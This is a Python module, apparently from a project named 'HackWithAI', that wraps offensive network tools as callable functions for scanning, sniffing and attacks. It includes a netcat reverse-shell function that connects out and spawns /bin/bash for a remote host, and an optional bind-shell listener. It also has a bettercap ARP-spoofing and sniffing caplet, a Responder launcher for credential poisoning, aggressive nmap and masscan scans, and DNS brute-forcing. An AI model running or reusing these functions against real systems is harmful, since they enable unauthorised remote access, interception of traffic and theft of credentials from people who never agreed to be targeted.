#!/usr/bin/env python3
"""Network Hacking Tools — nmap, masscan, netcat, tcpdump, bettercap, responder, dnsrecon"""

import subprocess, json, re, os, sys, shutil
from pathlib import Path
from typing import Optional, List, Dict

OUTPUT_DIR = Path("/home/kali/HackWithAI/data/scans")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def _run(cmd: List[str], timeout: int = 300, capture: bool = True) -> dict:
    try:
        r = subprocess.run(cmd, capture_output=capture, text=True, timeout=timeout)
        return {"ok": r.returncode == 0, "stdout": r.stdout, "stderr": r.stderr, "rc": r.returncode}
    except FileNotFoundError:
        return {"ok": False, "error": f"Tool not found: {cmd[0]}"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "Timeout"}

def _which(tool: str) -> bool:
    return shutil.which(tool) is not None

# ── nmap ─────────────────────────────────────────────────────────────────
def nmap_scan(target: str, ports: str = "", args: str = "-sV -sC", sudo: bool = True) -> dict:
    """Run nmap scan with service detection and default scripts."""
    cmd = (["sudo"] if sudo else []) + ["nmap", "-T4"]
    if ports: cmd += ["-p", ports]
    cmd += args.split()
    cmd.append(target)
    return _run(cmd, timeout=600)

def nmap_os_detect(target: str) -> dict:
    return _run(["sudo", "nmap", "-O", "-T4", target], timeout=600)

def nmap_all_ports(target: str) -> dict:
    return _run(["sudo", "nmap", "-p-", "-T4", "--open", target], timeout=900)

# ── masscan ──────────────────────────────────────────────────────────────
def masscan(target: str, ports: str = "1-65535", rate: int = 10000) -> dict:
    return _run(["sudo", "masscan", target, "-p", ports, "--rate", str(rate), "--wait", "0"],
                timeout=300)

# ── netcat ───────────────────────────────────────────────────────────────
def netcat_listen(port: int, command: str = "") -> dict:
    """Start a netcat listener (bind shell if command provided)."""
    cmd = ["nc", "-lvnp", str(port)]
    if command: cmd += ["-e", command]
    return _run(cmd, timeout=10, capture=False)

def netcat_connect(host: str, port: int) -> dict:
    return _run(["nc", "-nv", host, str(port)], timeout=15, capture=False)

def netcat_reverse_shell(lhost: str, lport: int) -> dict:
    """Connect back and spawn a shell."""
    return _run(["nc", lhost, str(lport), "-e", "/bin/bash"], timeout=15, capture=False)

# ── tcpdump ──────────────────────────────────────────────────────────────
def tcpdump_capture(interface: str = "eth0", count: int = 100, outfile: str = "") -> dict:
    path = outfile or str(OUTPUT_DIR / f"capture_{interface}.pcap")
    cmd = ["sudo", "tcpdump", "-i", interface, "-c", str(count), "-w", path]
    return _run(cmd, timeout=60)

# ── bettercap ────────────────────────────────────────────────────────────
def bettercap_arp_spoof(target: str, gateway: str = "", interface: str = "eth0") -> dict:
    caplet = f"net.probe on; net.sniff on; set arp.spoof.targets {target}; arp.spoof on"
    return _run(["sudo", "bettercap", "-iface", interface, "-eval", caplet], timeout=60, capture=False)

# ── responder ────────────────────────────────────────────────────────────
def responder_start(interface: str = "eth0") -> dict:
    return _run(["sudo", "responder", "-I", interface, "-wrf"], timeout=60, capture=False)

# ── dnsrecon ─────────────────────────────────────────────────────────────
def dnsrecon_enum(domain: str) -> dict:
    return _run(["dnsrecon", "-d", domain, "-t", "std"], timeout=120)

def dnsrecon_brute(domain: str, wordlist: str = "/usr/share/wordlists/dns.txt") -> dict:
    return _run(["dnsrecon", "-d", domain, "-D", wordlist, "-t", "brt"], timeout=300)

# ── CLI ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "help"
    if cmd == "scan":       print(json.dumps(nmap_scan(sys.argv[2])))
    elif cmd == "masscan":  print(json.dumps(masscan(sys.argv[2])))
    elif cmd == "tcpdump":  print(json.dumps(tcpdump_capture()))
    elif cmd == "dnsrecon": print(json.dumps(dnsrecon_enum(sys.argv[2])))
    else: print("Commands: scan <target> | masscan <target> | tcpdump | dnsrecon <domain>")
